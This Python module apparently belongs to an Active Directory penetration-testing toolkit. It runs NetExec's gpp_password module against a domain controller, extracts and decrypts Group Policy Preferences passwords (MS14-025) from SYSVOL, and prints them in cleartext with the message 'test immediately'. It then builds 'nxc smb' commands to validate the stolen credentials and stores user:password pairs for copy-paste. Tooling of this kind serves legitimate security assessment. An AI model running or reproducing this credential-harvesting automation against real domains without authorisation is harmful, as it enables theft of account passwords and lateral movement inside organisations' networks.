"""GPP (Group Policy Preferences) password enumeration.

This module searches SYSVOL for Group Policy Preferences XML files that
may contain encrypted passwords. The encryption key is publicly known
(MS14-025), allowing decryption of any found cpassword values.

This is pure SMB file reading - reads XML files from SYSVOL share.
No command execution on the target.
"""

import re

from ..core.colors import Colors, c
from ..core.output import JSON_DATA, debug_nxc, output, print_section, status
from ..core.runner import run_nxc
from ..parsing.nxc_output import is_nxc_noise_line

# Files that may contain GPP passwords
GPP_FILES = [
    "Groups.xml",  # Local user/group settings
    "Services.xml",  # Service account settings
    "ScheduledTasks.xml",  # Scheduled task credentials
    "DataSources.xml",  # ODBC data source credentials
    "Printers.xml",  # Printer mapping credentials
    "Drives.xml",  # Drive mapping credentials
]

# Regex patterns for parsing nxc gpp_password output
RE_USERNAME = re.compile(r"userName:\s*(\S+)", re.IGNORECASE)
RE_PASSWORD = re.compile(r"password:\s*(\S+)", re.IGNORECASE)
RE_CHANGED = re.compile(r"changed:\s*(.+)", re.IGNORECASE)
RE_FILE = re.compile(r"file:\s*(.+)", re.IGNORECASE)


def enum_gpp_password(args, cache):
    """Enumerate GPP passwords from SYSVOL.

    Searches for Group Policy Preferences XML files containing cpassword
    values. Found passwords are decrypted using the publicly known AES key
    (decryption is done locally by nxc).

    MS14-025: https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-025
    """
    target = cache.target if cache else args.target
    print_section("GPP Password Enumeration", target)

    # SYSVOL only exists on Domain Controllers - skip member servers
    domain_info = cache.domain_info or {}
    is_dc = domain_info.get("is_dc")
    is_domain_controller = domain_info.get("is_domain_controller")

    if is_dc is False or is_domain_controller is False:
        status("Skipping: SYSVOL only exists on Domain Controllers", "info")
        output(c("    Target is a member server - GPP passwords stored on DCs only", Colors.BLUE))
        output("")
        return

    auth = cache.auth_args
    status("Searching SYSVOL for GPP passwords (MS14-025)...")

    # Run nxc gpp_password module
    gpp_args = ["smb", target] + auth + ["-M", "gpp_password"]
    rc, stdout, stderr = run_nxc(gpp_args, args.timeout)
    debug_nxc(gpp_args, stdout, stderr, "GPP Password")

    gpp_findings = []
    current_finding = {}

    # Parse output
    for line in stdout.split("\n"):
        line = line.strip()
        if not line:
            continue

        if is_nxc_noise_line(line):
            continue

        # Look for GPP_PASSWORD module markers
        if "GPP_PASSWORD" in line or "gpp_password" in line.lower():
            # Check for credential info
            username_match = RE_USERNAME.search(line)
            password_match = RE_PASSWORD.search(line)
            changed_match = RE_CHANGED.search(line)
            file_match = RE_FILE.search(line)

            if username_match:
                current_finding["username"] = username_match.group(1)
            if password_match:
                current_finding["password"] = password_match.group(1)
            if changed_match:
                current_finding["changed"] = changed_match.group(1)
            if file_match:
                current_finding["file"] = file_match.group(1)

            # If we have both username and password, save finding
            if current_finding.get("username") and current_finding.get("password"):
                if current_finding not in gpp_findings:
                    gpp_findings.append(current_finding.copy())
                current_finding = {}

        # Alternative format: direct credential display
        if "cpassword" in line.lower() or ("userName" in line and "password" in line):
            parts = re.findall(r"(\w+):\s*(\S+)", line)
            for key, value in parts:
                if key.lower() == "username":
                    current_finding["username"] = value
                elif key.lower() == "password":
                    current_finding["password"] = value

    # Check for access/error conditions
    combined = stdout + stderr
    access_denied = "STATUS_ACCESS_DENIED" in combined.upper()
    no_gpp = "No GPP" in combined or "0 passwords" in combined.lower()

    # Store in cache
    cache.gpp_passwords = gpp_findings

    if gpp_findings:
        status(
            f"FOUND {len(gpp_findings)} GPP PASSWORD(S)!",
            "success",
        )
        output("")

        output(
            c(
                "GPP PASSWORDS (MS14-025 - Decrypted)",
                Colors.RED + Colors.BOLD,
            )
        )
        output(f"{'-'*60}")

        for finding in gpp_findings:
            username = finding.get("username", "Unknown")
            password = finding.get("password", "Unknown")
            changed = finding.get("changed", "Unknown")
            source_file = finding.get("file", "SYSVOL GPP")

            output(f"  {c('Username:', Colors.CYAN)} {username}")
            output(f"  {c('Password:', Colors.RED + Colors.BOLD)} {password}")
            if changed != "Unknown":
                output(f"  {c('Changed:', Colors.YELLOW)} {changed}")
            output(f"  {c('Source:', Colors.BLUE)} {source_file}")
            output("")

        output(
            c(
                "[!] These are cleartext credentials - test immediately!",
                Colors.RED + Colors.BOLD,
            )
        )
        output("")

        # Build auth hint
        if args.user:
            auth_hint = f"-u '{args.user}'"
            if args.password:
                auth_hint += f" -p '{args.password}'"
            elif args.hash:
                auth_hint += f" -H '{args.hash}'"
            else:
                auth_hint += " -p '<password>'"
        else:
            auth_hint = "-u <user> -p <pass>"

        # Add high-priority next steps for each credential
        for finding in gpp_findings:
            username = finding.get("username", "Unknown")
            password = finding.get("password", "")
            if password:
                cache.add_next_step(
                    finding=f"GPP password found for {username}",
                    command=f"nxc smb {target} -u '{username}' -p '{password}'",
                    description="Validate recovered GPP credentials",
                    priority="high",
                )

        # Store for copy-paste
        cache.copy_paste_data["gpp_usernames"] = {
            f.get("username") for f in gpp_findings if f.get("username")
        }
        cache.copy_paste_data["gpp_passwords"] = {
            f"{f.get('username')}:{f.get('password')}"
            for f in gpp_findings
            if f.get("username") and f.get("password")
        }

    elif access_denied:
        status("Access denied to SYSVOL share", "warning")
        output(c("    Cannot check for GPP passwords without SYSVOL access", Colors.YELLOW))
        output(c("    Tip: May need Domain User rights to read SYSVOL", Colors.YELLOW))
    elif no_gpp:
        status("No GPP passwords found in SYSVOL", "info")
        output(
            c(
                "    Checked: Groups.xml, Services.xml, ScheduledTasks.xml, "
                "DataSources.xml, Printers.xml, Drives.xml",
                Colors.BLUE,
            )
        )
        output(c("    Result: No cpassword values found (patched or never used)", Colors.BLUE))
    else:
        if not stdout.strip() or rc != 0:
            status("Could not enumerate GPP passwords", "error")
        else:
            status("No GPP passwords found in SYSVOL", "info")
            output(c("    Searched SYSVOL for GPP XML files - none contain cpassword", Colors.BLUE))

    if args.json_output:
        JSON_DATA["gpp_passwords"] = {
            "findings": gpp_findings,
            "count": len(gpp_findings),
        }
